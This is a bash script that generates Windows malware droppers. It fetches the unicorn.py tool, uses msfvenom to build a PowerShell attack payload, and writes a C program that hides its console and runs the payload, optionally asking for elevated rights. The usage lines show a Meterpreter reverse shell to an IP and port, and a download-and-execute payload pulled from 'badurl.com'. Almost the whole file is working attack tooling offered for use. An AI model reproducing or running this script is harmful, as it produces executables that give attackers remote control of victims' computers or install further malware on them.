#!/bin/bash
clear
echo '-------------------------------------------------------------------------'
echo '*****           Unicorn Powershell2C code generator                ******'
echo '-------------------------------------------------------------------------'
echo '[*] Getting the unirorn.py code...'
wget -N "https://raw.githubusercontent.com/trustedsec/unicorn/master/unicorn.py"
echo "[*] Patching  unicorn.py"
sed -i 's/msfvenom/.\/msfvenom/g' unicorn.py
echo ""
echo "" 
if [ -z "$*" ];then  
echo '****************************************************************************'
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
echo 'Usage: unicorn2c.sh payload reverse_ipaddr port platform' 
echo 'Usage: unicorn2c.sh payload exename exeurl platform' 
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 uac' 
echo 'Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe nonuac' 
echo 'Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe uac' 
echo 'Valid platforms are: nonuac uac' 
echo '***************************************************************************'
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
exit 0 
fi
case $4 in 
nonuac)
echo '***************************************************************************'
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
echo '[*] Checking if metasploit msfvenom is present..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path.....good'
else
   echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 
echo 'Generating nonUAC unicorn.c ...' 
python unicorn.py $1 $2 $3  
echo '#include <stdio.h>' > unicorn.c 
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c 
echo '#include <aclapi.h>' >> unicorn.c 
echo '#include <shlobj.h>' >> unicorn.c 
echo '#include <windows.h>' >> unicorn.c 
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c  
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c 
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c 
echo 'FreeConsole();' >> unicorn.c  
echo -n ' ShellExecute( NULL,NULL, "powershell.exe", "' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{11}//' >> unicorn.c
echo -n '",NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c 
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c 
todos unicorn.c 
echo '[*] Exported unicorn.c To compile use cl.exe unicorn.c on some windows box'
;;

uac)
echo '****************************************************'
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
echo '[*] Checking if metasploit msfvenom is present..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path.....good'
else
   echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi
echo 'Generating UAC  unicorn.c ...'
python unicorn.py $1 $2 $3
echo '#include <stdio.h>' > unicorn.c
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c
echo '#include <windows.h>' >> unicorn.c
echo '#include <aclapi.h>' >> unicorn.c
echo '#include <shlobj.h>' >> unicorn.c
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c
echo 'FreeConsole();' >> unicorn.c
echo -n ' ShellExecute( NULL, "runas", "powershell.exe", "' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{11}//' >> unicorn.c
echo -n '",NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c
todos unicorn.c
echo '[*] Exported unicorn.c To compile use cl.exe unicorn.' 
;;

"")
echo '[!] Usage: unicorn2c.sh payload reverse_ipaddr port platform'
echo '[!] Usage: unicorn2c.sh payload exename exeurl platform'
echo '[!] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo '[!] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 uac'
echo '[!] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe nonuac'
echo '[!] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe uac'
echo '[!] Valid platforms are: nonuac uac'

exit 0 
;;
esac
